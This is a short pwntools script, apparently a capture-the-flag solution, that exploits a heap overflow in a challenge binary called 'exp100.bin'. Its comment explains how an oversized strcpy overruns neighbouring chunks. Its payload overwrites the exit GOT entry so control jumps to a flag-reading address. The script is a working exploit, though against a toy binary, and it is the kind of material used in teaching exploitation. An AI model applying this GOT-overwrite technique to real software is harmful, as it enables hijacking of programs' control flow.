#!/usr/bin/python

from pwn import *

'''
What's up here: First, four calls to malloc are made. Two chunks store the references to two other chunks.

{a}-> {b}  {c}->{d}
 ^          ^
  \_________|______{refs on stack | rbp-0x1010 +0x1000 buffer | canary}

Then, fgets reads 0x1000 bytes of user data onto the stack, before it gets strcpy'd into malloc'd buffer b. For such a large size, it is very easy to overrun the next two chunks entirely, thus allowing the reference in c for d to point somewhere else entirely. 

'''

context.arch = 'amd64'

e = ELF("exp100.bin")

exit_got = e.got['exit']

write1 = fit({5*8: flat(exit_got)})
flag_read = flat(0x00400826)

#file("payload","w").write( write1 + '\n' + flat(0x00400826))

p = process("./exp100.bin")
p.sendline(write1)
p.sendline(flag_read)
print p.recv()
